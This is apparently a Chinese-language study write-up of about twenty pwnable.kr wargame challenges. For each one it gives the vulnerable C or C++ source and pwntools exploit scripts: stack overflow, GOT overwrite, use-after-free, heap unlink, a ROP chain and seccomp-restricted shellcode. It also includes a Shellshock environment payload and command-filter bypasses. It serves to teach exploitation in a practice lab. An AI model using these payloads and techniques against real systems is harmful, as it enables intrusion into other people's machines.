### 注意：图片在同名文件夹下


* username/passwd:1XOR0 
* 使用`su username`可以在靶机中切换题目

### 01 file describor
* 题目
  ```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  char buf[32];
  int main(int argc, char* argv[], char* envp[]){
          if(argc<2){
                  printf("pass argv[1] a number\n");
                  return 0;
          }
          int fd = atoi( argv[1] ) - 0x1234;
          int len = 0;
          len = read(fd, buf, 32);
          if(!strcmp("LETMEWIN\n", buf)){
                  printf("good job :)\n");
                  system("/bin/cat flag");
                  exit(0);
          }
          printf("learn about Linux file IO\n");
          return 0;

  }

  ```
* read(0,buf,size) //0代表stdin，1代表stdout，2代表stderr

### 02 collision
* 题目
  ```c
  //collision.c
  #include <stdio.h>
  #include <string.h>
  unsigned long hashcode = 0x21DD09EC;
  unsigned long check_password(const char* p){
      int* ip = (int*)p; //输入的字符串被当作整数，字符串从内存低地址向高地址输入，而整数的存储按照小端存储。
      //小端存储 数值0x1234->内存中\x04\x03\x02\x01
      int i;
      int res=0;
      for(i=0; i<5; i++){
          res += ip[i];
      }
      return res;
  }

  int main(int argc, char* argv[]){
      if(argc<2){
          printf("usage : %s [passcode]\n", argv[0]);
          return 0;
      }
      if(strlen(argv[1]) != 20){
          printf("passcode length should be 20 bytes\n");
          return 0;
      }

      if(hashcode == check_password( argv[1] )){
          system("/bin/cat flag");
          return 0;
      }
      else
          printf("wrong passcode.\n");
      return 0;
  }
  ```
* 哈希碰撞
* char\*变为int\* 20个字节分为5个int，这5个int加起来等于hashcode，即0x01010101*4+0x1dd905e8=hashcode
* 
  ```shell 
  ./col `python -c 'print "\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06"'`

  ./col `python -c 'print "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xe8\x05\xd9\x1d"'`
  ```

### 03 bof 
* 题目
  ```c
  #include <stdio.h>
  #include <string.h>
  #include <stdlib.h>
  void func(int key){
      char overflowme[32];# 注意栈上数据的排列，低地址到高地址：局部变量 ebp 返回地址 参数
      printf("overflow me : ");
      gets(overflowme);       // smash me!
      if(key == 0xcafebabe){
              system("/bin/sh");
      }
      else{
              printf("Nah..\n");
      }
  }
  int main(int argc, char* argv[]){
      func(0xdeadbeef);
      return 0;
  }
  ```
* 栈溢出 
* 题解
  ```python
  from pwn import *
  p=remote('pwnable.kr',9000)
  shellcode = b'A'*0x2c+b'A'*4*2+p32(0xcafebabe)
  p.sendline(shellcode)
  p.interactive()
  ```


### 04 upx脱壳
* upx -d



### 05 passcode
* ```c
  #include <stdio.h>
  #include <stdlib.h>

  void login(){
          int passcode1;
          int passcode2;

          printf("enter passcode1 : ");
          scanf("%d", passcode1);
          fflush(stdin);

          // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
          printf("enter passcode2 : ");
          scanf("%d", passcode2);

          printf("checking...\n");
          if(passcode1==338150 && passcode2==13371337){
                  printf("Login OK!\n");
                  system("/bin/cat flag");
          }
          else{
                  printf("Login Failed!\n");
                  exit(0);
          }
  }

  void welcome(){
          char name[100];
          printf("enter you name : ");
          scanf("%100s", name);
          printf("Welcome %s!\n", name);
  }

  int main(){
          printf("Toddler's Secure Login System 1.0 beta.\n");

          welcome();
          login();

          // something after login...
          printf("Now I can safely trust you that you have credential :)\n");
          return 0;
  }

  ```

* scanf("%100s", name);scanf会自动添加\x00。
* scanf("%d %d",&a,&b);scanf参数都为指针，但是题目中没有使用指针。
* login函数和welcome函数栈底相同，所以name和passcode1在同一片内存区域。
* **got表覆写**：构造name从而控制passcode1的值为某个函数A的got地址，然后利用scanf函数将函数A的got地址的值改为执行system的地址，这样执行函数A时就会转去执行system函数。
* 题解
  ```python
  from pwn import *
  server = ssh('passcode', 'pwnable.kr', 2222, 'guest')
  io = server.process('./passcode')
  system_addr = 0x080485E3
  printf_got = 0x0804A000
  name = b'a'*96+p32(printf_got) # name将改写passcode1的值为prinf函数got地址。此时passcode1为指针。
  io.sendlineafter('name : ',name)
  #print(io.recv())  # 使用sendafter时，不需要recv
  io.sendlineafter('passcode1 : ',b'134514147')  #因为是scanf('%d')，所以不用p32()，直接输入数字即可。 scanf函数将prinf函数的got覆盖为system。
  result = io.recvall()
  io.close()
  server.close()
  print(result)

  from pwn import *
  s = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)
  payload = 'c'*96+'\x00\xa0\x04\x08'+'\n'+'134514147\n'
  sh = s.process('passcode')
  sh.sendline(payload)
  print sh.recvall()
  io.close()
  server.close()
  ``` 

### 06 random
* 系统在调用rand()之前都会自动调用srand(),如果在srand()里给参数seed指定了一个值，那么 rand()就会将seed的值作为产生伪随机数的初始值；而如果用户在rand()前没有调用过srand()，那么系统默认将1作为伪随机数的初始值，如果初始值是此时的1或是其他定值，那么每次rand()产生的随机数序列都是一样的，这也就是所谓的“伪随机数”。
* 题目
  ```c
  #include <stdio.h>
  int main(){
      unsigned int random;
      random = rand();        // random value!

      unsigned int key=0;
      scanf("%d", &key);

      if( (key ^ random) == 0xdeadbeef ){
              printf("Good!\n");
              system("/bin/cat flag");
              return 0;
      }

      printf("Wrong, maybe you should try 2^32 cases.\n");
      return 0;
  }
  ```
* 每次rand的数字为1804289383=3039230856^0xdeadbeef

### 07 input
* 题目
  ```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>

  int main(int argc, char* argv[], char* envp[]){
      printf("Welcome to pwnable.kr\n");
      printf("Let's see if you know how to give input to program\n");
      printf("Just give me correct inputs then you will get the flag :)\n");

      // argv
      if(argc != 100) return 0;
      if(strcmp(argv['A'],"\x00")) return 0;
      if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
      printf("Stage 1 clear!\n");

      // stdio
      char buf[4];
      read(0, buf, 4);
      if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
      read(2, buf, 4);
      if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
      printf("Stage 2 clear!\n");

      // env
      if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
      printf("Stage 3 clear!\n");

      // file
      FILE* fp = fopen("\x0a", "r");
      if(!fp) return 0;
      if( fread(buf, 4, 1, fp)!=1 ) return 0;
      if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
      fclose(fp);
      printf("Stage 4 clear!\n");

      // network
      int sd, cd;
      struct sockaddr_in saddr, caddr;
      sd = socket(AF_INET, SOCK_STREAM, 0);
      if(sd == -1){
              printf("socket error, tell admin\n");
              return 0;
      }
      saddr.sin_family = AF_INET;
      saddr.sin_addr.s_addr = INADDR_ANY;
      saddr.sin_port = htons( atoi(argv['C']) );
      if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
              printf("bind error, use another port\n");
              return 1;
      }
      listen(sd, 1);
      int c = sizeof(struct sockaddr_in);
      cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
      if(cd < 0){
              printf("accept error, tell admin\n");
              return 0;
      }
      if( recv(cd, buf, 4, 0) != 4 ) return 0;
      if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
      printf("Stage 5 clear!\n");

      // here's your flag
      system("/bin/cat flag");
      return 0;
  }

  ```
* 题解
  建立软链接 `ln -s /home/input2/flag flag`
  ```python
  from pwn import *
  #server = ssh('input2', 'pwnable.kr', 2222, 'guest')
  #io = server.process('./input '+'a '*100+'A='+'\x00 '+'B='+'\x20\x0a\x0d')

  # argv
  stage1 = [b'A'] * 100
  stage1[ord('A')] = b'\x00'
  stage1[ord('B')] = b'\x20\x0a\x0d'

  # stdio
  # 使用管道
  r1, w1 = os.pipe()
  r2, w2 = os.pipe()
  os.write(w1, b'\x00\x0a\x00\xff')
  os.write(w2, b'\x00\x0a\x02\xff')

  # env
  env = {b'\xde\xad\xbe\xef':b'\xca\xfe\xba\xbe'}
  # fd
  with open('\x0a', 'w') as f:
      f.write('\x00\x00\x00\x00')

  stage1[ord('C')] = b'9999'

  io = process(executable='./input', argv=stage1, stdin=r1, stderr=r2, env=env)

  # socket
  msg = remote('localhost', 9999)
  msg.sendline(b'\xde\xad\xbe\xef')

  print(io.recv())

  ```

### 08 leg
* arm汇编语言
* [题解](https://www.cnblogs.com/countfatcode/p/11196350.html)


### 09 
* ```c
  #include <stdio.h>
  #include <fcntl.h>

  #define PW_LEN 10
  #define XORKEY 1

  void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
  }

  int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){ //运算符优先级错误，先执行<，再执行=，导致fd=0，即stdin
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
  }
  ```
* 运算符优先级错误


### 10 
* ```c
  #include <stdio.h>
  int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
  }
  ```
* 破壳漏洞 CVE-2014-6271：GNU Bash 4.3 及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行 Shell 命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用 Bash Shell 之前可以用构造的值创建环境变量。这些变量可以包含代码，在 Shell 被调用后会被立即执行。
* `env x='() { :;}; echo; echo vulnerable' ./bash -c :`
* `env x='() { :;}; /bin/cat flag' ./shellshock`

### 11 coin1
* 在很多正常硬币中找特殊硬币，2^尝试次数一定大于给的硬币总数。
* 使用二分法即可

### 12 lotto
* ```python
  from pwn import *
  s = ssh(host='pwnable.kr', user='lotto', password='guest', port=2222)
  payload = b'!!!!!!'
  sh = s.process('./lotto')
  for i in range(200):
      sh.recv()
      sh.sendline(b'1')
      sh.recv()
      sh.sendline(payload)
      sh.recvlines(2)
  sh.close()
  s.close()
  ```

### 13 cmd1
* ```c
  #include <stdio.h>
  #include <string.h>

  int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
  }
  int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
  }
  ```
* char *strstr(const char *haystack, const char *needle)在字符串 haystack 中查找第一次出现字符串 needle 的位置，返回指针。
* 过滤命令中的字符
* `./cmd1 "/bin/cat /home/cmd1/fl*"` mommy now I get what PATH environment is for :)

### 14 cmd2
* ```c
  #include <stdio.h>
  #include <string.h>

  int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
  }

  extern char** environ;
  void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
  }

  int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
  }
  ```
* command [-p] [utility [argument ...]]的-p选项的命令允许我们使用默认值PATH进行搜索。它保证找到所有标准实用程序。 system本质是调用execve /bin/sh 来执行命令的。所以要想方法借助sh的特性来出现。
* `./cmd2 "command -p cat f*"`

### 15 uaf
* ```c++
  #include <fcntl.h>
  #include <iostream>
  #include <cstring>
  #include <cstdlib>
  #include <unistd.h>
  using namespace std;

  class Human{
  private:
      virtual void give_shell(){
          system("/bin/sh");
      }
  protected:
      int age;
      string name;
  public:
      virtual void introduce(){
          cout << "My name is " << name << endl;
          cout << "I am " << age << " years old" << endl;
      }
  };

  class Man: public Human{
  public:
          Man(string name, int age){
                  this->name = name;
                  this->age = age;
          }
          virtual void introduce(){
                  Human::introduce();
                  cout << "I am a nice guy!" << endl;
          }
  };

  class Woman: public Human{
  public:
          Woman(string name, int age){
                  this->name = name;
                  this->age = age;
          }
          virtual void introduce(){
                  Human::introduce();
                  cout << "I am a cute girl!" << endl;
          }
  };

  int main(int argc, char* argv[]){
          Human* m = new Man("Jack", 25);
          Human* w = new Woman("Jill", 21);

          size_t len;
          char* data;
          unsigned int op;
          while(1){
                  cout << "1. use\n2. after\n3. free\n";
                  cin >> op;

                  switch(op){
                          case 1:
                                  m->introduce();
                                  w->introduce();
                                  break;
                          case 2:
                                  len = atoi(argv[1]);
                                  data = new char[len];
                                  read(open(argv[2], O_RDONLY), data, len);
                                  cout << "your data is allocated" << endl;
                                  break;
                          case 3:
                                  delete m;
                                  delete w;
                                  break;
                          default:
                                  break;
                  }
          }

          return 0;
  }
  ```
* fastbin attack + uaf
* c++多态：虚函数使用的其核心目的是通过基类访问派生类定义的函数。子类可以继承或者重写父类的虚函数。
  ![Alt text](./pwnable.kr题解/virtualfunc.png)
* c++类的内存分配如上图。成员函数存储在代码段，成员函数使用this指针访问成员变量。thiscall中，ecx寄存器为this指针，存储着对象的首地址。
* 在C++中，如果类中有虚函数，那么它就会有一个指向虚函数表的指针__vfptr，在类对象最开始的内存数据中，之后是类中的成员变量的内存数据。虚函数表中，先存放父类的虚函数，再存放子类的虚函数。如果子类重载了父类的某些虚函数，那么新的虚函数将虚函数表中父类的这些虚函数覆盖。
* 本题中，先delete对象，再new申请字符串，就会申请到对象所在的内存，这时对象的指针就变成了悬挂指针。对这些内存进行更改，可以修改对象的虚表，然后调用对象的虚函数时就会执行指定函数。
* ```shell
  python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" > /tmp/exp.txt
  ./uaf 24 /tmp/exp.txt  # 要申请到m的内存，free m和w后需要再调用两次new char。
  # 释放m和w后第一次调用new char申请到的是w的内存，然后直接执行m->introduce为什么报段错误？可能是执行时判断m指针指向的内存为未分配已释放内存？
  ```

### 16 memcpy
* ```c
  // compiled with : gcc -o memcpy memcpy.c -m32 -lm
  #include <stdio.h>
  #include <string.h>
  #include <stdlib.h>
  #include <signal.h>
  #include <unistd.h>
  #include <sys/mman.h>
  #include <math.h>

  unsigned long long rdtsc(){
          asm("rdtsc");
  }

  char* slow_memcpy(char* dest, const char* src, size_t len){
  	int i;
  	for (i=0; i<len; i++) {
  		dest[i] = src[i];
  	}
  	return dest;
  }

  char* fast_memcpy(char* dest, const char* src, size_t len){
  	size_t i;
  	// 64-byte block fast copy
  	if(len >= 64){
  		i = len / 64;
  		len &= (64-1);
  		while(i-- > 0){
  			__asm__ __volatile__ (
  			"movdqa (%0), %%xmm0\n"
  			"movdqa 16(%0), %%xmm1\n"
  			"movdqa 32(%0), %%xmm2\n"  //从内存位置 32(%0)（即 src + 32）复制数据到 %%xmm2 寄存器。
  			"movdqa 48(%0), %%xmm3\n"
  			"movntps %%xmm0, (%1)\n"
  			"movntps %%xmm1, 16(%1)\n"
  			"movntps %%xmm2, 32(%1)\n"
  			"movntps %%xmm3, 48(%1)\n"  //movntps 将XMM寄存器中的数据存储到内存。这里，它分别将 %%xmm0、%%xmm1、%%xmm2 和 %%xmm3 寄存器中的数据存储到内存位置 (%1)（即 dest）、16(%1)（即 dest + 16）、32(%1)（即 dest + 32）和 48(%1)（即 dest + 48）。
  			::"r"(src),"r"(dest):"memory");  //(%0) 和 (%1) 是占位符，它们分别代表第一个和第二个输出操作数，即 src 和 dest。在汇编代码被编译和链接时，GCC会将这些占位符替换为实际的寄存器名或内存地址，这些寄存器或内存地址包含了 src 和 dest 的值。
  			dest += 64;
  			src += 64;
  		}
  	}

  	// byte-to-byte slow copy
  	if(len) slow_memcpy(dest, src, len);
  	return dest;
  }

  int main(void){

  	setvbuf(stdout, 0, _IONBF, 0);
  	setvbuf(stdin, 0, _IOLBF, 0);

  	printf("Hey, I have a boring assignment for CS class.. :(\n");
  	printf("The assignment is simple.\n");

  	printf("-----------------------------------------------------\n");
  	printf("- What is the best implementation of memcpy?        -\n");
  	printf("- 1. implement your own slow/fast version of memcpy -\n");
  	printf("- 2. compare them with various size of data         -\n");
  	printf("- 3. conclude your experiment and submit report     -\n");
  	printf("-----------------------------------------------------\n");

  	printf("This time, just help me out with my experiment and get flag\n");
  	printf("No fancy hacking, I promise :D\n");

  	unsigned long long t1, t2;
  	int e;
  	char* src;
  	char* dest;
  	unsigned int low, high;
  	unsigned int size;
  	// allocate memory
  	char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  	char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  	src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

  	size_t sizes[10];
  	int i=0;

  	// setup experiment parameters
  	for(e=4; e<14; e++){	// 2^13 = 8K
  		low = pow(2,e-1);
  		high = pow(2,e);
  		printf("specify the memcpy amount between %d ~ %d : ", low, high);
  		scanf("%d", &size);
  		if( size < low || size > high ){
  			printf("don't mess with the experiment.\n");
  			exit(0);
  		}
  		sizes[i++] = size;
  	}

  	sleep(1);
  	printf("ok, lets run the experiment with your configuration\n");
  	sleep(1);

  	// run experiment
  	for(i=0; i<10; i++){
  		size = sizes[i];
  		printf("experiment %d : memcpy with buffer size %d\n", i+1, size);
  		dest = malloc( size );

  		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
  		t1 = rdtsc();
  		slow_memcpy(dest, src, size);		// byte-to-byte memcpy
  		t2 = rdtsc();
  		printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1);

  		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
  		t1 = rdtsc();
  		fast_memcpy(dest, src, size);		// block-to-block memcpy
  		t2 = rdtsc();
  		printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1);
  		printf("\n");
  	}

  	printf("thanks for helping my experiment!\n");
  	printf("flag : ----- erased in this source code -----\n");
  	return 0;
  }

  ```
* SSE（Stream SIMD Extentions，数据流单指令多数据扩展）。SSE新增的8个128位寄存器（xmm0 ~ xmm7），每个寄存器可以用来存放4个32位单精度浮点数，8个16位整型数。也就是说，SSE中的所有计算都是一次性针对4个浮点数来完成的，这种批处理会带来显著的效率提升。
* MOVNTPS 是 x86 架构中的一个 SIMD (单指令多数据) 浮点指令，它属于 Intel 的 SSE (Streaming SIMD Extensions) 指令集。这个指令主要用于在内存和浮点寄存器之间移动数据。movntps指令需要目的地址16字节对齐，即address & 0xF = 0。但是32位程序的堆分配机制在分配chunk时不一定是16字节的整数倍，而是字长的两倍，即2*size_sz=8。
* 如何控制malloc分配的内存起始地址为16字节对齐？使得分配的 chunk大小 是 16 字节对齐，就是用户每次输入的 size，要保证堆的地址是 16 的整数倍。这里要考虑chunk分配时，需要加上chunk head的大小8Bytes（prev_size+size）。
  ```python
  for e in range(4, 14):
      low = pow(2, e - 1);
      high = pow(2, e);
      for x in range(low, high):
          if (8 + x) % 8 != 0:
              n = (8 + x) / 8 + 1
          else:
              n = (8 + x) / 8
          if 8 * n % 16 == 0:
              print("%d ~ %d: %d" % (low, high, x) )
              break
  ```
* 不同bins中chunk大小


### 17 asm
* ```c
  #include <stdio.h>
  #include <string.h>
  #include <stdlib.h>
  #include <sys/mman.h>
  #include <seccomp.h>
  #include <sys/prctl.h>
  #include <fcntl.h>
  #include <unistd.h>

  #define LENGTH 128

  void sandbox(){
          scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
          if (ctx == NULL) {
                  printf("seccomp error\n");
                  exit(0);
          }

          seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
          seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
          seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
          seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
          seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

          if (seccomp_load(ctx) < 0){
                  seccomp_release(ctx);
                  printf("seccomp error\n");
                  exit(0);
          }
          seccomp_release(ctx);
  }

  char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";  //使用文心一言解释为将 x86-64 架构的所有通用寄存器（除了 rsp 和 rip）清零。
  unsigned char filter[256];
  int main(int argc, char* argv[]){

          setvbuf(stdout, 0, _IONBF, 0);
          setvbuf(stdin, 0, _IOLBF, 0);

          printf("Welcome to shellcoding practice challenge.\n");
          printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
          printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
          printf("If this does not challenge you. you should play 'asg' challenge :)\n");

          char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
          memset(sh, 0x90, 0x1000);
          memcpy(sh, stub, strlen(stub));

          int offset = sizeof(stub);
          printf("give me your x64 shellcode: ");
          read(0, sh+offset, 1000);

          alarm(10);
          chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
          sandbox();
          ((void (*)(void))sh)();
          return 0;
  }

  ```
* 题解：使用pwntool构造汇编语言的shellcode
  ```python
  from pwn import * 
  context.arch='amd64'
  flagname='this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
  shellcode=''
  shellcode+=shellcraft.pushstr(flagname)  #通过push将flag文件放入到栈里面
  shellcode += shellcraft.open('rsp',0,0)  #open打开该文件
  shellcode += shellcraft.read('rax','rsp',0x80)  #读取0x80个字节到rsp中
  shellcode += shellcraft.write(1,'rsp',0x80)  #1代表stdout，从rsp开始读取0x80个字节

  r = remote('pwnable.kr',9026)
  r.sendline(asm(shellcode))
  print(r.recvall()) # Welcome to shellcoding practice challenge.

  ```

### 18 unlink
* ```c++
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  typedef struct tagOBJ{
          struct tagOBJ* fd;
          struct tagOBJ* bk;
          char buf[8];
  }OBJ;

  void shell(){
          system("/bin/sh");
  }

  void unlink(OBJ* P){
          OBJ* BK;
          OBJ* FD;
          BK=P->bk;
          FD=P->fd;
          FD->bk=BK;
          BK->fd=FD;
  }
  int main(int argc, char* argv[]){
          malloc(1024);
          OBJ* A = (OBJ*)malloc(sizeof(OBJ));
          OBJ* B = (OBJ*)malloc(sizeof(OBJ));
          OBJ* C = (OBJ*)malloc(sizeof(OBJ));

          // double linked list: A <-> B <-> C
          A->fd = B;
          B->bk = A;
          B->fd = C;
          C->bk = B;

          printf("here is stack address leak: %p\n", &A);
          printf("here is heap address leak: %p\n", A);
          printf("now that you have leaks, get shell!\n");
          // heap overflow!
          gets(A->buf);

          // exploit this unlink!
          unlink(B);
          return 0;
  }

  ```
* unlink:此题不能使用常规的FD=target addr - 12 ,BK=except value，会导致非法写入。
* 查看main函数结尾，发现以下代码，可以改写ebp-4，进而控制ret时的rip。
  ```assembly
  mov     ecx, [ebp-4] //ecx=*(ebp-4)
  leave
  lea     esp, [ecx-4] //esp=ecx-4=*(ebp-4)-4
  retn //pop rip , rip=*(esp)
  ```
* 参考：[看雪：Glibc Heap 利用之初识 Unlink](https://zhuanlan.zhihu.com/p/51211954)
* 题解
  ```python
  from pwn import *
  r = ssh('unlink','pwnable.kr',2222,'guest')
  p = r.process("./unlink")
  shell_addr=0x080484eb
  p.recvuntil("here is stack address leak: ")
  leak_stack = int(p.recv(10),16)  #接收的是字符串形式的16进制，如0x08041234正好是10个字节。
  p.recvuntil("here is heap address leak: ")
  leak_heap= int(p.recv(10),16)
  p.recv()
  ebp_addr=leak_stack+0x14
  ecx_addr=ebp_addr-0x4
  padding=b'a'*8
  payload=p32(shell_addr)+b'a'*4  #A->buf
  payload+=padding  # chunk header
  payload+=p32(leak_heap+12)  # B->fd  unlink时，*(leak_heap+12+4)=BK=ebp_addr-4，此时改写的是堆上的数据，不会导致非法写入
  payload+=p32(ebp_addr-4)  # B->bk  unlink时，*(ebp_addr-4)=FD=leak_heap+12
  p.sendline(payload)
  p.interactive()
  ```

### 19 blukat
* ```c
  #include <stdio.h>
  #include <string.h>
  #include <stdlib.h>
  #include <fcntl.h>
  char flag[100];
  char password[100];
  char* key = "3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+";
  void calc_flag(char* s){
      int i;
      for(i=0; i<strlen(s); i++){
              flag[i] = s[i] ^ key[i];
      }
      printf("%s\n", flag);
  }
  int main(){
      FILE* fp = fopen("/home/blukat/password", "r");
      fgets(password, 100, fp);
      char buf[100];
      printf("guess the password!\n");
      fgets(buf, 128, stdin);   //128-112=16
      if(!strcmp(password, buf)){
              printf("congrats! here is your flag: ");
              calc_flag(password);
      }
      else{
              printf("wrong guess!\n");
              exit(0);
      }
      return 0;
  }

  ```
* 开启了canary。
* ls -al查看文件权限，password 文件只有 root 用户和 blukat_pwn 组内的用户可读。blukat本身就属于 blukat_pwn 组，拥有对 password 文件的读权限。
* password 内容为cat: password: Permission denied，容易被迷惑，可以使用xxd指令查看16进制内容。

### 20 horcruxes 
* solution
```python
from pwn import *
context.log_level = 'debug'
r = ssh('horcruxes','pwnable.kr',2222,'guest')
p = r.process("./horcruxes")
A_addr = 0x0809FE4B
call_A = 0x080A0044 # 不能使用，因为call指令会将下一条指令地址压栈，从而破坏rop链。
B_addr = 0x0809FE6A
C_addr = 0x0809FE89
D_addr = 0x0809FEA8
E_addr = 0x0809FEC7
F_addr = 0x0809FEE6
G_addr = 0x0809FF05
ropme_openflag_addr = 0x080A010B  #无法正常跳转，该地址不能使用，只能使用call_ropme的地址
call_ropme = 0x0809FFFC  
rop_shellcode = b'a'*(0x74+4)+p32(A_addr)+p32(B_addr)+p32(C_addr)+p32(D_addr)+p32(E_addr)+p32(F_addr)+p32(G_addr)+p32(call_ropme)  #多个返回地址相连压入栈中，函数返回ret时会依次跳转到这些地址执行。这些地址应该是函数的起始地址，而不是call函数的指令的地址。链上最后一个rop地址不影响。
p.recvuntil('Select Menu:')
p.sendline('1')
p.recvuntil('How many EXP did you earned? : ')
p.sendline(rop_shellcode)
p.recvline()

sum = 0
for i in range(0,7):  # recv a ~ g
    res = p.recvline()
    recvdata = int(res.strip('\n').split('+')[1][:-1])
    log.info("The %d" % i)
    log.info("recvdata %d" % recvdata)
    sum += recvdata
p.recvuntil('Select Menu:')
p.sendline('1')
p.recvuntil('How many EXP did you earned? : ')
p.sendline(str(sum).encode())
p.recv()
p.close()
r.close()
```

## 
### 
